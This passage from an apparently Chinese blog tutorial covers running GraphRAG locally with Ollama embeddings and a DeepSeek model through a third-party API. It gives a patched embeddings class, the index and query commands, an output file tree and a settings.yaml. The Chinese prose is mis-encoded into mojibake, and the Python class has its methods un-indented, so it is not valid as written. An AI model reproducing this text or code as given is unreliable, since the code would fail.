class="keyword">import</span> Unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> graphrag.llm.base <span class="keyword">import</span> BaseLLM</span><br><span class="line"><span class="keyword">from</span> graphrag.llm.types <span class="keyword">import</span> (</span><br><span class="line">    EmbeddingInput,</span><br><span class="line">    EmbeddingOutput,</span><br><span class="line">    LLMInput,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .openai_configuration <span class="keyword">import</span> OpenAIConfiguration</span><br><span class="line"><span class="keyword">from</span> .types <span class="keyword">import</span> OpenAIClientTypes</span><br><span class="line"><span class="keyword">import</span> ollama</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OpenAIEmbeddingsLLM</span>(BaseLLM[EmbeddingInput, EmbeddingOutput]):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A text-embedding generator LLM.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">_client: OpenAIClientTypes</span><br><span class="line">_configuration: OpenAIConfiguration</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, client: OpenAIClientTypes, configuration: OpenAIConfiguration</span>):</span><br><span class="line">    <span class="variable language_">self</span>.client = client</span><br><span class="line">    <span class="variable language_">self</span>.configuration = configuration</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_execute_llm</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, <span class="built_in">input</span>: EmbeddingInput, **kwargs: Unpack[LLMInput]</span></span><br><span class="line"><span class="params"></span>) -&gt; EmbeddingOutput | <span class="literal">None</span>:</span><br><span class="line">    args = &#123;</span><br><span class="line">        <span class="string">&quot;model&quot;</span>: <span class="variable language_">self</span>.configuration.model,</span><br><span class="line">        **(kwargs.get(<span class="string">&quot;model_parameters&quot;</span>) <span class="keyword">or</span> &#123;&#125;),</span><br><span class="line">    &#125;</span><br><span class="line">    embedding_list = []</span><br><span class="line">    <span class="keyword">for</span> inp <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">        embedding = ollama.embeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>, prompt=inp)</span><br><span class="line">        embedding_list.append(embedding[<span class="string">&quot;embedding&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> embedding_list</span><br></pre></td></tr></table></figure><p>å°†ç›¸å…³æ–‡ä»¶æ›¿æ¢åå†æ‰“å¼€OllamaæœåŠ¡<br>æ„å»ºç´¢å¼•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.index --root ./test</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥æ¯”è¾ƒåƒç”µè„‘é…ç½®ï¼Œä¹Ÿæ˜¯æœ€è€—æ—¶é—´çš„ä¸€æ­¥<a href="https://www.bilibili.com/video/BV18HeFetELw/?spm_id_from=333.337.search-card.all.click&vd_source=4966528acd6540678eedd7b9e188a2d1">bç«™è§†é¢‘</a>æ¼”ç¤ºæ—¶ç”¨4090çš„æ˜¾å¡ç”¨æ—¶20åˆ†é’Ÿå·¦å³ï¼Œç¬”è€…4050çš„æ˜¾å¡å¯¹åŒæ ·çš„å†…å®¹æ„å»ºç´¢å¼•ç”¨æ—¶5ä¸ªå°æ—¶å¤š<br>æ„å»ºå®Œæˆåä¼šç”Ÿæˆæ–°çš„æ–‡ä»¶ï¼Œæ–‡ä»¶æ ‘å¦‚ä¸‹:  </p><details><summary>æ–‡ä»¶æ ‘ä¿¡æ¯</summary><pre><code>graphrag    â””â”€test    â”‚  .env    â”‚  settings.yaml    â”‚    â”œâ”€cache    â”‚  â”œâ”€community_reporting    â”‚  â”‚      create_community_report-chat-v2-05abb9bf64290c9593fdf820d26481cf    â”‚  â”‚      create_community_report-chat-v2-1d14150b78007a447e3fa0837dcffdaf    â”‚  â”‚      create_community_report-chat-v2-271f82c36ff44fbd67460a754c266913    â”‚  â”‚      create_community_report-chat-v2-3e3d3051081db242b891f5ae4ad67fcf    â”‚  â”‚      create_community_report-chat-v2-42e023a1562f8c66f13f5c777ac818ec    â”‚  â”‚      create_community_report-chat-v2-4c80f68a16e7f9be9f0a6b9cd1d3d34b    â”‚  â”‚      create_community_report-chat-v2-51395309fff3199ff962e02406cc197b    â”‚  â”‚      create_community_report-chat-v2-5462d20ae65c7eac3aab71d89ffd03ae    â”‚  â”‚      create_community_report-chat-v2-554bff36ee06e5296942b2ebb5cd703e    â”‚  â”‚      create_community_report-chat-v2-594610a39f5182e73c12713784231567    â”‚  â”‚      create_community_report-chat-v2-5fb041980124144a5187671d5f9ef7c1    â”‚  â”‚      create_community_report-chat-v2-604dc46d0b608c1fb2a0a88e1c26c18f    â”‚  â”‚      create_community_report-chat-v2-6233741ed71795443e0963984eede331    â”‚  â”‚      create_community_report-chat-v2-6baccacf0c8af460442670b043ebc58a    â”‚  â”‚      create_community_report-chat-v2-9830304cddab1938d93309cd87dca984    â”‚  â”‚      create_community_report-chat-v2-ad70d90f5ad8ba5724a5bea6ff8068fe    â”‚  â”‚      create_community_report-chat-v2-c122141aa4fce67d3d8fa4e0912f5cd9    â”‚  â”‚      create_community_report-chat-v2-c6b3fa698d6f9bb13839b4b5f2de6a09    â”‚  â”‚      create_community_report-chat-v2-ca4edabf6cc676f6871692266746c334    â”‚  â”‚      create_community_report-chat-v2-ca567d9b1ca158c168050f79c3a537b9    â”‚  â”‚      create_community_report-chat-v2-d60f9dcc73210deda01c184fc596798f    â”‚  â”‚      create_community_report-chat-v2-dd1e70b6bedeb1b789210ffaf49850ef    â”‚  â”‚      create_community_report-chat-v2-e89427b5d9b62f26a4f8512b659381c6    â”‚  â”‚      create_community_report-chat-v2-edfc839d3ad587d0526a09a1c0edb576    â”‚  â”‚      create_community_report-chat-v2-f5fbd1774628a941881852f16a9db1c6    â”‚  â”‚    â”‚  â”œâ”€entity_extraction    â”‚  â”‚      chat-032f9152180cb73aa6361b9d7a4c5f4f    â”‚  â”‚      chat-0724634f1bbc9ad130bcbc74b925d790    â”‚  â”‚      chat-073e6a86870be1dac8d98235cbce53cf    â”‚  â”‚      chat-09953ce8ff455e119a86efef7cb9db4e    â”‚  â”‚      chat-0a9b5f904984bde0d5903afe4c5660c0    â”‚  â”‚      chat-10bb9702786e793e90708d4c4d83ddbe    â”‚  â”‚      chat-1254787c5c59a04910be58886e22423b    â”‚  â”‚      chat-13f71b7cde778647b08b04473239ebee    â”‚  â”‚      chat-145157a268a088f09517b9fe18184664    â”‚  â”‚      chat-16439cb18f3d84f0464a7bef8c673e46    â”‚  â”‚      chat-1cc3028b53ebff886f53ee54c1cf85b4    â”‚  â”‚      chat-1e46cd715eba33b8ad196dce7fb856dd    â”‚  â”‚      chat-2263c946e34afdcfb4fba9b74102ae39    â”‚  â”‚      chat-27503eac54753b5b416147afd6fe0b9a    â”‚  â”‚      chat-28cc4e416c64c09c127847e258fffa28    â”‚  â”‚      chat-2b71daba59b14cff548ef0a1b9fe3f58    â”‚  â”‚      chat-31352d85282ab0e8064c84c9ec7e6926    â”‚  â”‚      chat-37d57b96e0cea19e879895821587b0ce    â”‚  â”‚      chat-390ebbcd0c49c9f23b371f15264af3ab    â”‚  â”‚      chat-40b0c066be7658ef38edcfb4fe66bcdb    â”‚  â”‚      chat-45cbb5220a3c2fff3bc43483d69bcde9    â”‚  â”‚      chat-49ad7b53b38f51530c35271f8c14445f    â”‚  â”‚      chat-4aeb85961e2208e789009836b18ff4dd    â”‚  â”‚      chat-4ee46f56ac68a8e57c7474d5695a48c6    â”‚  â”‚      chat-516e2c87253f6bd1732ed3503e42dd5f    â”‚  â”‚      chat-51ac8f2ff87118bff9b5217be10cfc34    â”‚  â”‚      chat-63fce99631cfa2665f7edc4fa33f7910    â”‚  â”‚      chat-64f0f91e1293274dc4fcf8e8b42855e3    â”‚  â”‚      chat-66ce70bf6a5575997b9b2d8fa3500e61    â”‚  â”‚      chat-6fd6b29f5df7a7388c817d3d1d1e975d    â”‚  â”‚      chat-71ba19681e8c39400ca0be94852ee810    â”‚  â”‚      chat-75accb8c949fce7000f99cbe9b93affa    â”‚  â”‚      chat-78ccd2fccbbc6ec781a8ec0760139088    â”‚  â”‚      chat-7c0b98404e66a871053a90c24f87fad6    â”‚  â”‚      chat-7d3d70997c76c4bd512a3020538ca806    â”‚  â”‚      chat-7e4005e318f45c32a29dcbfa13351ac2    â”‚  â”‚      chat-7e4bd47083ec5aa34338012c137d2ba2    â”‚  â”‚      chat-876e73405558a9c5680459c7822dd711    â”‚  â”‚      chat-998f13aa561e5793aaeed2bd4bd8fe68    â”‚  â”‚      chat-9ab3ed5b7281c24a90757032d5951e60    â”‚  â”‚      chat-9c9c6f9c8a587a71969d8b4d9ca2908a    â”‚  â”‚      chat-9e9abf4e0d55b9ae227f297d9b5f5215    â”‚  â”‚      chat-a0b28adbb1e8f8525d7a850c15496fbb    â”‚  â”‚      chat-a336f847197574dc0a40fa378a589480    â”‚  â”‚      chat-a56e7ce13268d9f7e8e12e1c5e4c6e26    â”‚  â”‚      chat-a9f877a576849dd8f4fcfc1dce7ab0c5    â”‚  â”‚      chat-aa0464f36359ee401ed913208d53d5c2    â”‚  â”‚      chat-ab478973d5a34a8a59a199008fc206b8    â”‚  â”‚      chat-afbb1be3681850f2a9ef44a006244733    â”‚  â”‚      chat-bce13bc9ef500314e22ad6355b42f50e    â”‚  â”‚      chat-bfc78eefcdc0965215d68653b30c083f    â”‚  â”‚      chat-c0836b6a8f97567516efa45f7a94277c    â”‚  â”‚      chat-c2ae9aea64b9d86e4415e5aa8316abd6    â”‚  â”‚      chat-cd2b1488110c968a8f53a896f6c1a32f    â”‚  â”‚      chat-cdabd00dd0498d453190672c654477bb    â”‚  â”‚      chat-d70fd65b636c8f57145ab78771f6fbd8    â”‚  â”‚      chat-d82832bb48c027b7c19304cc6b527e4e    â”‚  â”‚      chat-d8e2de0bc5255b04f8e473bfbface9ed    â”‚  â”‚      chat-df6b5ec0f944076f71de96cd65424d7a    â”‚  â”‚      chat-e98922775b9cf30f8f7dbe0eb5fbac28    â”‚  â”‚      chat-eb56da4f497786d8396a1eb58f1dde2e    â”‚  â”‚      chat-ec6bd8525b63dfda444ede9beaf9f6f7    â”‚  â”‚      chat-ecb8dc4edafdaba16e46061f70b8e355    â”‚  â”‚      chat-ee379d70ac019c01d85e3bb5087049c2    â”‚  â”‚      chat-ef7a067fd3ea712a77592afbe4f6de47    â”‚  â”‚      chat-efffe90bffc9bcd92b514faed2d9489e    â”‚  â”‚      chat-f0a7e1fed922a4365bd8f630f5261a24    â”‚  â”‚      chat-f1ca6b11b3308cde9e09db38fc63cbbd    â”‚  â”‚      chat-f48bcac29f5576927d7ae3bea9aa4c98    â”‚  â”‚      chat-f5acc5a055d74f1740d3d58201377339    â”‚  â”‚      chat-f945d689383c8a56cbbe9e574f24d2c2    â”‚  â”‚      chat-f975271f56fd59cb1465f91e07df687d    â”‚  â”‚      chat-fb483c3b2473ce5785cb0146eb5e9c9a    â”‚  â”‚      chat-ff6ef2319f9165f08e545d0767ff924d    â”‚  â”‚    â”‚  â”œâ”€summarize_descriptions    â”‚  â”‚      summarize-chat-v2-003e6f17c44fa9f7241ee1527423e43c    â”‚  â”‚      summarize-chat-v2-0111309938aab181470b89060ec24442    â”‚  â”‚      summarize-chat-v2-016bad277a717d5da37080ed5e70b90b    â”‚  â”‚      summarize-chat-v2-024106b87667a5582f378b91f1fdb02a    â”‚  â”‚      summarize-chat-v2-030edb5cfcdbba4e00392de7f6978d6f    â”‚  â”‚      summarize-chat-v2-0b6f437082c883d402fe03096cc5a921    â”‚  â”‚      summarize-chat-v2-0de73858ec7e1d451d7a56fd537fffd8    â”‚  â”‚      summarize-chat-v2-0eed95ca68821a57424c7451f0c6bc06    â”‚  â”‚      summarize-chat-v2-0fe96c5d141c2a059846d92761cef405    â”‚  â”‚      summarize-chat-v2-10f62aea52a0f47f88eb400ed1bddb70    â”‚  â”‚      summarize-chat-v2-110cf5d7261219ff5e391371e9664252    â”‚  â”‚      summarize-chat-v2-13425352b9bfecb77de6565555e9b095    â”‚  â”‚      summarize-chat-v2-138001166023225fcc78359871935641    â”‚  â”‚      summarize-chat-v2-14a34a041a8d88fb6ad6c62d49c817b1    â”‚  â”‚      summarize-chat-v2-15c6b29e3b14c601cf1bb9376e36c18a    â”‚  â”‚      summarize-chat-v2-161910c230526bd72a7567f30eca1908    â”‚  â”‚      summarize-chat-v2-1632daf868840e3cf8a37e9dd0bc9882    â”‚  â”‚      summarize-chat-v2-16548c5df2692c73a9a940dcca94d880    â”‚  â”‚      summarize-chat-v2-16cc1b478baa5458ef16ece91f3f9ae0    â”‚  â”‚      summarize-chat-v2-16e9ea0dfb88d6a405211c09dafaf50b    â”‚  â”‚      summarize-chat-v2-1c15d0040fb14b976fe5404d30d0b83d    â”‚  â”‚      summarize-chat-v2-24aded28ce97c451a60d22b374d6e8c6    â”‚  â”‚      summarize-chat-v2-25fdc49681ec1fc30a1f4a49fa95daf0    â”‚  â”‚      summarize-chat-v2-2a82c53dbb12f5aee6569c0cde068e0e    â”‚  â”‚      summarize-chat-v2-2de4ef3a6f7b35a63189d1a13bbc6829    â”‚  â”‚      summarize-chat-v2-351298e5a217e01311146ab5bda9e104    â”‚  â”‚      summarize-chat-v2-36941f96761fe8e5d947545c9ebc60e9    â”‚  â”‚      summarize-chat-v2-37652d39a35352f3a3f62aa5de0665dd    â”‚  â”‚      summarize-chat-v2-3a77846de17b12ae2181964641e9121f    â”‚  â”‚      summarize-chat-v2-41330bc0bcc627cc476b4e3ffa41262f    â”‚  â”‚      summarize-chat-v2-443fae61b422b9f0f33b393e26eb0911    â”‚  â”‚      summarize-chat-v2-4a16ff9a55ecd9cace1b53388f95ef87    â”‚  â”‚      summarize-chat-v2-4b2c952b232684f2d482ed56d25df57f    â”‚  â”‚      summarize-chat-v2-4d8877e6189fbcaa71306e30a412af8e    â”‚  â”‚      summarize-chat-v2-4e51874a785a49a7680d4e7a381f9892    â”‚  â”‚      summarize-chat-v2-52bcbd68d841d4040ef0d293f45e1433    â”‚  â”‚      summarize-chat-v2-53f8eacd17eac1ec5472a6b24b5087f8    â”‚  â”‚      summarize-chat-v2-548627422eb8ebe543c02f6e669d3234    â”‚  â”‚      summarize-chat-v2-597ba70e28259763ab8ceb945df7b5c5    â”‚  â”‚      summarize-chat-v2-5c945e57b2b8ceb6d6108d7c94240d2c    â”‚  â”‚      summarize-chat-v2-66e9870edc5aeecaac81e064bd0eb6da    â”‚  â”‚      summarize-chat-v2-6dbf79ac2d8fffc26e3fc6adab6b4756    â”‚  â”‚      summarize-chat-v2-6fa0877ac2fbc977860a35bec4a3e0e5    â”‚  â”‚      summarize-chat-v2-7826fa70e94561f6a7860aeb7c9f680c    â”‚  â”‚      summarize-chat-v2-7d9204a8a01163d206642ed445c1aaad    â”‚  â”‚      summarize-chat-v2-82abcd27b01c562c837c158438288460    â”‚  â”‚      summarize-chat-v2-87709b069217dfc06cbe6924c69daf31    â”‚  â”‚      summarize-chat-v2-8a9a5de5f342691e7dbc9a5393770733    â”‚  â”‚      summarize-chat-v2-8ea4dcf284103040937122c641e23c1e    â”‚  â”‚      summarize-chat-v2-90cbce2a26bf49b80231d0c21f1eb029    â”‚  â”‚      summarize-chat-v2-9866dff0c1cdd20dcc7db277b6a0b1b9    â”‚  â”‚      summarize-chat-v2-9beed2e64b45eb4e08d41770053bf516    â”‚  â”‚      summarize-chat-v2-9deffa7a07d9cf882485e488cab07303    â”‚  â”‚      summarize-chat-v2-a51568b0be6075215eee21e542504a8c    â”‚  â”‚      summarize-chat-v2-aa9c47fcafab2db504d500f0a2866061    â”‚  â”‚      summarize-chat-v2-ad24ebb5edc9e698b09b423bfbc90c00    â”‚  â”‚      summarize-chat-v2-af7f06fdbd5ee952541ce212ee70f88e    â”‚  â”‚      summarize-chat-v2-b05dee3e1b76c1f4c185598a2a007e75    â”‚  â”‚      summarize-chat-v2-b0865b2b95d7b6b68e71a7212d5678b5    â”‚  â”‚      summarize-chat-v2-b0e3ba0b0148b262cb7daf5ab3c39fdd    â”‚  â”‚      summarize-chat-v2-b3026421439fce8149f12dedb11dd1a6    â”‚  â”‚      summarize-chat-v2-b46137131e6df3b6b9e7a02298941b8b    â”‚  â”‚      summarize-chat-v2-b8decc33711671985a62f54a51d8f237    â”‚  â”‚      summarize-chat-v2-ba689229a075298f86efb17a66ea1825    â”‚  â”‚      summarize-chat-v2-bd242600da735741d4828fee4ec0bf76    â”‚  â”‚      summarize-chat-v2-bd78c8df3c2165c20664d28755b4dc20    â”‚  â”‚      summarize-chat-v2-d285f69cdaf28421c6e1c41905fea14d    â”‚  â”‚      summarize-chat-v2-d74f4b71256d0864621c05d2b6d62e12    â”‚  â”‚      summarize-chat-v2-d7fbfff54e8e1a93cc5b044c8378a295    â”‚  â”‚      summarize-chat-v2-d935666422858760baa4aed4ba679b96    â”‚  â”‚      summarize-chat-v2-e18e32ec57028de6014746ae6757baea    â”‚  â”‚      summarize-chat-v2-e4a25834ee69b75748928a26fa3fc027    â”‚  â”‚      summarize-chat-v2-e811fe09014b24b60867835f28d61bdb    â”‚  â”‚      summarize-chat-v2-ec0b9ff923f8340777e0d12299acf89e    â”‚  â”‚      summarize-chat-v2-ecfdeeaca201c64a9fe074f7f93f63ba    â”‚  â”‚      summarize-chat-v2-f07a87ad14a82c1aab91d449341810c0    â”‚  â”‚      summarize-chat-v2-f88aad56197e5a6b0fe0065431fd46b3    â”‚  â”‚      summarize-chat-v2-f8c0918e1dfd851196599de97b3198c0    â”‚  â”‚      summarize-chat-v2-f8f8a0a88c9a162e274888a79a81e5e7    â”‚  â”‚    â”‚  â””â”€text_embedding    â”‚          embedding-0609f21a0bdf6154b03521b48c8af1ca    â”‚          embedding-097d6b5d89865a9762d8b7cc4fd8ee6a    â”‚          embedding-19c35e988be1a687105874580195806e    â”‚          embedding-614b486ac95aaa1cbc4a2446afdac601    â”‚          embedding-7c5eef2cb4b2d0fa93f052a4a759be3b    â”‚          embedding-9aaa300ba484af06e980a31dd0b418bb    â”‚          embedding-a367fcefe3261ded72b5661a121a711f    â”‚          embedding-a81e03fdd29a9a6cc98e6e29ebab6095    â”‚    â”œâ”€input    â”‚      book.txt    â”‚    â”œâ”€output    â”‚  â”œâ”€20240820-100343    â”‚  â”‚  â””â”€reports    â”‚  â”‚          indexing-engine.log    â”‚  â”‚    â”‚  â””â”€20240820-100459    â”‚      â”œâ”€artifacts    â”‚      â”‚      create_base_documents.parquet    â”‚      â”‚      create_base_entity_graph.parquet    â”‚      â”‚      create_base_extracted_entities.parquet    â”‚      â”‚      create_base_text_units.parquet    â”‚      â”‚      create_final_communities.parquet    â”‚      â”‚      create_final_community_reports.parquet    â”‚      â”‚      create_final_documents.parquet    â”‚      â”‚      create_final_entities.parquet    â”‚      â”‚      create_final_nodes.parquet    â”‚      â”‚      create_final_relationships.parquet    â”‚      â”‚      create_final_text_units.parquet    â”‚      â”‚      create_summarized_entities.parquet    â”‚      â”‚      join_text_units_to_entity_ids.parquet    â”‚      â”‚      join_text_units_to_relationship_ids.parquet    â”‚      â”‚      stats.json    â”‚      â”‚    â”‚      â””â”€reports    â”‚              indexing-engine.log    â”‚              logs.json    â”‚    â””â”€prompts            claim_extraction.txt            community_report.txt            entity_extraction.txt            summarize_descriptions.txt</code></pre></details>æŸ¥è¯¢æŒ‡ä»¤  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.query --root ./test --method global <span class="string">&quot;ä½ è¦é—®çš„é—®é¢˜&quot;</span></span><br></pre></td></tr></table></figure><p>â€“methodå¯ä»¥æœ‰globalå’Œlocalä¸¤ç§æ–¹å¼</p><p>ç›®å‰å¥½åƒå¯¹ä¸­æ–‡æ–‡æœ¬çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œåœ¨è¿›è¡Œä¸­æ–‡æ–‡æœ¬çš„ç´¢å¼•æ„å»ºæ—¶æ€»æŠ¥é”™ã€‚</p><h3 id="1-3ä½¿ç”¨deepseekå¤§æ¨¡å‹è¿›è¡Œæœ¬åœ°éƒ¨ç½²"><a href="#1-3ä½¿ç”¨deepseekå¤§æ¨¡å‹è¿›è¡Œæœ¬åœ°éƒ¨ç½²" class="headerlink" title="1.3ä½¿ç”¨deepseekå¤§æ¨¡å‹è¿›è¡Œæœ¬åœ°éƒ¨ç½²"></a>1.3ä½¿ç”¨deepseekå¤§æ¨¡å‹è¿›è¡Œæœ¬åœ°éƒ¨ç½²</h3><p>ä½¿ç”¨å›½å†…å¤§æ¨¡å‹apiæ¥å£<br>å®˜ç½‘:<a href="https://agicto.com/">https://agicto.com/</a><br>åªéœ€è¦æ›´æ”¹åˆå§‹åŒ–åäº§ç”Ÿçš„.envå’Œsettings.yamlæ–‡ä»¶<br>è·å–apiå¯†é’¥åå°†.envå’Œsettings.yamlæ–‡ä»¶æ›´æ”¹æˆå¦‚ä¸‹å†…å®¹:<br>.envæ–‡ä»¶:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRAPHRAG_API_KEY=ä½ çš„å¯†é’¥</span><br></pre></td></tr></table></figure><p>setting.yamlæ–‡ä»¶</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">encoding_model: cl100k_base</span><br><span class="line">skip_workflows: []</span><br><span class="line">llm:</span><br><span class="line">  api_key: $&#123;GRAPHRAG_API_KEY&#125;</span><br><span class="line">  type: openai_chat # or azure_openai_chat</span><br><span class="line">  model: deepseek-chat</span><br><span class="line">  model_supports_json: false # recommended if this is available for your model.</span><br><span class="line">  # max_tokens: 4000</span><br><span class="line">  # request_timeout: 180.0</span><br><span class="line">  api_base: https://api.agicto.cn/v1</span><br><span class="line">  # api_version: 2024-02-15-preview</span><br><span class="line">  # organization: &lt;organization_id&gt;</span><br><span class="line">  # deployment_name: &lt;azure_model_deployment_name&gt;</span><br><span class="line">  # tokens_per_minute: 150_000 # set a leaky bucket throttle</span><br><span class="line">  # requests_per_minute: 10_000 # set a leaky bucket throttle</span><br><span class="line">  # max_retries: 10</span><br><span class="line">  # max_retry_wait: 10.0</span><br><span class="line">  # sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span><br><span class="line">  # concurrent_requests: 25 # the number of parallel inflight requests that may be made</span><br><span class="line">  # temperature: 0 # temperature for sampling</span><br><span class="line">  # top_p: 1 # top-p sampling</span><br><span class="line">  # n: 1 # Number of completions to generate</span><br><span class="line"></span><br><span class="line">parallelization:</span><br><span class="line">  stagger: 0.3</span><br><span class="line">  # num_threads: 50 # the number of threads to use for parallel processing</span><br><span class="line"></span><br><span class="line">async_mode: threaded # or asyncio</span><br><span class="line"></span><br><span class="line">embeddings:</span><br><span class="line">  ## parallelization: override the global parallelization settings for embeddings</span><br><span class="line">  async_mode: threaded # or asyncio</span><br><span class="line">  llm:</span><br><span class="line">    api_key: $&#123;GRAPHRAG_API_KEY&#125;</span><br><span class="line">    type: openai_embedding # or azure_openai_embedding</span><br><span class="line">    model: text-embedding-3-small</span><br><span class="line">    api_base: https://api.agicto.cn/v1</span><br><span class="line">    # api_version: 2024-02-15-preview</span><br><span class="line">    # organization: &lt;organization_id&gt;</span><br><span class="line">    # deployment_name: &lt;azure_model_deployment_name&gt;</span><br><span class="line">    # tokens_per_minute: 150_000 # set a leaky bucket throttle</span><br><span class="line">    # requests_per_minute: 10_000 # set a leaky bucket throttle</span><br><span class="line">    # max_retries: 10</span><br><span class="line">    # max_retry_wait: 10.0</span><br><span class="line">    # sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span><br><span class="line">    # concurrent_requests: 25 # the number of parallel inflight requests that may be made</span><br><span class="line">    # batch_size: 16 # the number of documents to send in a single request</span><br><span class="line">    # batch_max_tokens: 8191 # the maximum number of tokens to send in a single request</span><br><span class="line">    # target: required # or optional</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunks:</span><br><span class="line">  size: 300</span><br><span class="line">  overlap: 100</span><br><span class="line">  group_by_columns: [id] # by default, we don&#x27;t allow chunks to cross documents</span><br><span class="line">    </span><br><span class="line">input:</span><br><span class="line">  type: file # or blob</span><br><span class="line">  file_type: text # or csv</span><br><span class="line">  base_dir: &quot;input&quot;</span><br><span class="line">  file_encoding: utf-8</span><br><span class="line">  file_pattern: &quot;.*\\.txt$&quot;</span><br><span class="line"></span><br><span class="line">cache:</span><br><span class="line">  type: file # or blob</span><br><span class="line">  base_dir: &quot;cache&quot;</span><br><span class="line">  # connection_string: &lt;azure_blob_storage_connection_string&gt;</span><br><span class="line">  # container_name: &lt;azure_blob_storage_container_name&gt;</span><br><span class="line"></span><br><span class="line">storage:</span><br><span class="line">  type: file # or blob</span><br><span class="line">  base_dir: &quot;output/$&#123;timestamp&#125;/artifacts&quot;</span><br><span class="line">  # connection_string: &lt;azure_blob_storage_connection_string&gt;</span><br><span class="line">  # container_name: &lt;azure_blob_storage_container_name&gt;</span><br><span class="line"></span><br><span class="line">reporting:</span><br><span class="line">  type: file # or console, blob</span><br><span class="line">  base_dir: &quot;output/$&#123;timestamp&#125;/reports&quot;</span><br><span class="line">  # connection_string: &lt;azure_blob_storage_connection_string&gt;</span><br><span class="line">  # container_name: &lt;azure_blob_storage_container_name&gt;</span><br><span class="line"></span><br><span class="line">entity_extraction:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  prompt: &quot;prompts/entity_extraction.txt&quot;</span><br><span class="line">  entity_types: [organization,person,geo,event]</span><br><span class="line">  max_gleanings: 0</span><br><span class="line"></span><br><span class="line">summarize_descriptions:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  prompt: &quot;prompts/summarize_descriptions.txt&quot;</span><br><span class="line">  max_length: 500</span><br><span class="line"></span><br><span class="line">claim_extraction:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span 